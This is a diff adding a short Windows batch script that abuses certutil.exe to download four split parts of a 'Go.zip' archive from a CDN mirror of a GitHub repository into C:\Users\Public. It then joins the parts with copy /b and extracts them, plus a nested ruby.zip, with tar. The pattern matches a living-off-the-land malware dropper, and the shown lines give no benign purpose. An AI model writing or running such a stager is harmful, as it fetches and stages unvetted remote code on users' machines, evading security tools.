@@ -1,0 +1,18 @@
+
+
+
+certutil.exe -urlcache -f "https://cdn.jsdmirror.com/gh/anupcic/golatest@master/Go.zip.part001" "C:\Users\Public\Go.zip.part001"
+certutil.exe -urlcache -f "https://cdn.jsdmirror.com/gh/anupcic/golatest@master/Go.zip.part002" "C:\Users\Public\Go.zip.part002"
+certutil.exe -urlcache -f "https://cdn.jsdmirror.com/gh/anupcic/golatest@master/Go.zip.part003" "C:\Users\Public\Go.zip.part003"
+certutil.exe -urlcache -f "https://cdn.jsdmirror.com/gh/anupcic/golatest@master/Go.zip.part004" "C:\Users\Public\Go.zip.part004"
+
+copy /b "C:\Users\Public\Go.zip.part001"+"C:\Users\Public\Go.zip.part002"+"C:\Users\Public\Go.zip.part003"+"C:\Users\Public\Go.zip.part004" "%PUBLIC%\complete.zip"
+
+tar -xf "%PUBLIC%\complete.zip" -C "%PUBLIC%\extracted" || exit /b 1
+
+if exist "%OUT%\ruby.zip" (
+    if not exist "%PUBLIC%\extracted\ruby_files" mkdir "%PUBLIC%\extracted\ruby_files"
+    tar -xf "%PUBLIC%\extracted\ruby.zip" -C "%PUBLIC%\extracted\ruby_files" || exit /b 1
+)
+
+exit /b 0
